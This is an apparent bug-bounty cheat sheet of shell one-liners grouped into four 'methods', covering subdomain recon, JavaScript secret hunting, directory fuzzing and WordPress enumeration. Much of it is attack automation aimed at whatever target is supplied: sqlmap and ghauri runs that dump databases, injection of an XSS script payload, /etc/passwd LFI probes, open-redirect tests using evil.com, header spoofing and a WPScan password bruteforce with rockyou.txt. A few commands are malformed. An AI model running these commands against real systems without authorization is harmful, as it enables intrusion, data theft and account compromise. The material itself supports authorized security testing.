Method 01:

🔍 Hidden Input Field Parameter Extraction:
cat alive.txt | rush 'curl -skL "{}"' | grep 'type="hidden"' | grep -Eo 'name="[^"]+"' | cut -d'"' -f2 | sort -u | anew params.txt

🦊 XSS Scanning using Dalfox: cat urls.txt | dalfox pipe --multicast -o xss.txt

🔎 Secret Discovery using SecretFinder: cat alive.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder

📂 Directory Bruteforcing with FFUF: cat alive.txt | xargs -I@ sh -c 'ffuf -c -w /path/to/wordlist -D -e php,aspx,html,do,ashx -u @/FUZZ -ac -t 200' | tee -a dir-ffuf.txt

📸 Screenshotting with Gowitness: assetfinder -subs-only target.com | httpx -silent -timeout 50 | xargs -I@ gowitness single @

📄 Find Version Info in Common Files: curl -s 'https://target.com/readme.html' | grep 'Version'

🧠 JavaScript Endpoint Discovery: echo "domain" | haktrails subdomains | httpx -silent | getJS --complete | anew JS

🔐 Detect Auth Pages on Multiple Ports: cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent

🌐 Censys IP Discovery: censys search "target.com" --index-type hosts | jq -c '.results[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'

🧭 Domains to IP Mapping: cat live-domain.txt | httpx -ip -silent -timeout 10 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | tee domains-ips.txt

🔁 FFUF Recursive Fuzzing with Multiple Params: ffuf -c -w urls.txt:URL -W wordlist.txt:FUZZ -u URL/FUZZ -mc all -fc 500,502 -ac -recursion -v -of json -o output.json

🗂️ Deep Bruteforce with Dirsearch: dirsearch -l urls.txt -w /home/kali/wordlist.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old.sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml --deep --recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt

💉 SQLi Automation (gau/hakrawler → SQLMap → Ghauri): cat subs.txt | gau | grep "=" | sort -u | anew tmp-sqli.txt
sqlmap -m tmp-sqli.txt --batch --random-agent --level=5 --risk=3 --dbs
while read -r url; do ghauri -u "$url" --level=3 --dbs --current-db --batch --confirm; done < tmp-sqli.txt

📁 Leaky File Discovery: echo target.com | (gau || hakrawler || waybackurls || katana) | grep -Eoi '\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar)$'

📜 JS Path & Endpoint Discovery: cat main.js | grep -oE '("[^"]*"|'[^']*'|\/[a-zA-Z0-9_/?=]+)' | sed -E 's/^["\']|["\']$//g' | sort -u

📄 JS Variable Extraction from Live URLs: cat subs.txt | gau | sort -u | httpx -silent -threads 100 | grep -Ev '\.(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt|pdf)$' | while read url; do vars=$(curl -s "$url" | grep -Eo 'var [a-zA-Z0-9_]+' | sed -e 's/var //' -e "s/$/='\$url'/g" | sed 's/.*/FUZZ=/g'); echo -e "\e[1;33m$url\e[1;32m$vars"; done

⚔️ XSS Injection Testing via QSReplace: echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' | qsreplace '"><script>alert(1)</script>' | while read -r host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo -e "$host \033[0;31mVulnerable\033[0m"; done

Method 02:
Lostsec:
🔹 1. Subdomain Enumeration : subfinder -d target.com -all -recursive > subdomains.txt

🔹 2. Fetch Subdomains from crt.sh : curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u

🔹 3. Check Alive Hosts : cat subdomains.txt | httpx -ports 80,8080,8000,8888 -threads 200 -silent > alive.txt

🔹 4. Open Port Scan : naabu -list alive.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt

🔹 5. Directory & File Fuzzing : dirsearch -l alive.txt -i 200,204,403 -x 500,502,429 -R 5 --random-agent -t 50 -F -w onelistforallshort.txt -o directory.txt

🔹 6. Get All Passive URLs:
cat alive.txt | gau > urls.txt
cat urls.txt | uro > clean_urls.txt

🔹 7. Find JavaScript Files: cat clean_urls.txt | grep "\.js$" > jsfiles.txt

🔹 8. Find Secrets in JS Files : 
cat jsfiles.txt | xargs -I {} python3 SecretFinder.py -i {} -o cli >> secrets.txt
xargs -a jsfiles.txt -I {} python3 SecretFinder.py -i {} -o cli >> secrets.txt

🔹 9. Vulnerability Scan with Nuclei: nuclei -list clean_urls.txt -t ~/Custom-Nuclei-Templates/ -o nuclei_results.txt

🔹 10. Target-Specific Scanners: 
gf xss < clean_urls.txt > xss_params.txt
nuclei -list xss_params.txt --tags xss -o xss_vulns.txt

Method 03:
🔍 Subdomain Enumeration & Resolution:
# Using subfinder and dnsx : subfinder -d vulnweb.com | dnsx -a -resp -rl 100 -o resolved.txt
# Using findomain + httpx : findomain -t example.com -u subs.txt && cat subs.txt | httpx -silent -o live_subs.txt
# Using assetfinder + httprobe + httpx : assetfinder --subs-only example.com | httprobe -p https:443 | httpx -silent -title -tech-detect -status-code -o output.txt
# Using amass + ghauri for SQLi testing : amass enum -d example.com -o amass.txt && ghauri -u "http://$(cat amass.txt)" --level 5

📁 Directory/File Bruteforcing:
# Using ffuf with subdomain fuzzing : ffuf -w directory-list-2.3-medium.txt -u https://example.com/FUZZ -H "Host: FUZZ.example.com" -o ffuf_output.txt
# Using gobuster : gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt

🕵️‍♂️ Subdomain Filtering (e.g. dev/stage): subfinder -d tesla.com -silent | dnsx -silent | cut -d ' ' -f1 | grep -E 'api|dev|stg|test|admin|demo|stage|pre|vpn'

💉 Open Redirect / XSS Testing via Archive URLs: waybackurls testphp.vulnweb.com | grep -ai '=http' | qsreplace 'http://evil.com' | while read host; do curl -s -L "$host" -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n"; done

🕸 Crawling + Dalfox for XSS:
# From single target
gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".*(jpg|jpeg|gif|css|png|ttf|woff2?|ico|pdf|svg|txt)" --other-source | \
grep "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe -o result.txt

# From list of URLs
gospider -S urls.txt -c 10 -d 5 --blacklist ".*(jpg|jpeg|gif|css|png|ttf|woff2?|ico|pdf|svg|txt)" --other-source | \
grep "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe -o result.txt

🧬 LFI Check Using GAU + gf + qsreplace: gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

📜 Subdomain Collection via Multiple Tools:
sublist3r -d example.com | tee -a subdomains.txt
subfinder -d example.com >> subdomains.txt
assetfinder --subs-only example.com >> subdomains.txt
amass enum -norecursive -noalts -d example.com >> subdomains.txt

🧪 Tech Detection via Nuclei: subfinder -d testphp.vulnweb.com -silent | httpx | nuclei -t technologies/tech-detect.yaml

🧨 SQLi Testing via waybackurls + sqlmap:
subfinder -dL testphp.vulnweb.com.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls
sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

🧰 Misc Pentest Commands:
# .git folder check : curl -sL target.com/.git/config | grep -q '[remote "origin"]' && echo ".git folder found!"
# Public key leak : curl -s http://target.com/.ssh/id_rsa.pub && echo "Public key found!"

# Header spoofing
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com
curl -H "Origin: evil.com" -I http://target.com

# FFUF common fuzz : ffuf -u http://target.com/FUZZ -w /path/to/wordlist.txt
# Nmap s3-buckets and vuln scan : nmap --script s3-buckets,nmap-vulners -p 80,443 target.com
# Subdomain takeover detection : subjack -w subdomains.txt -t 100 -timeout 30 -ssl -v
# Leak JavaScript endpoints : curl -s http://target.com/script.js | grep -Eo 'https?://[^ ]+'
# Basic SQLi test : sqlmap -u "http://target.com/page?id=1" --batch --level=3 --risk=2

Method 04:
🔍 1. Detect WordPress version : curl -s -L http://example.com | grep -oP 'content="WordPress \K[^"]+'

🎨 2. Detect WordPress theme name : curl -s -L http://example.com | grep -oP 'wp-content/themes/\K[^/"]+'

🧩 3. List plugins from source : curl -s -L http://example.com | grep -oP 'wp-content/plugins/\K[^/"]+' | sort -u

🔎 4. WPScan (requires installation) – version, plugins, themes : wpscan --url http://example.com --enumerate vp,vt,tt,cb,dbe,u

🔎 5. WPScanwpscan --url http://example.com

🔎 6. WPScanwpscan --url http://example.com --enumerate ap,at,cb,dbe,u,m

🔎 7. WPScanwpscan --url http://example.com --passwords rockyou.txt --usernames admin

🔎 8. Whatweb : whatweb http://example.com

🔎 9. Nmap : nmap -p 80,443 --script http-wordpress-enum http://example.com

🔎 10. Dirb : dirb http://example.com /usr/share/dirb/wordlists/common.txt

🔎 11. Nikto : nikto -h http://example.com








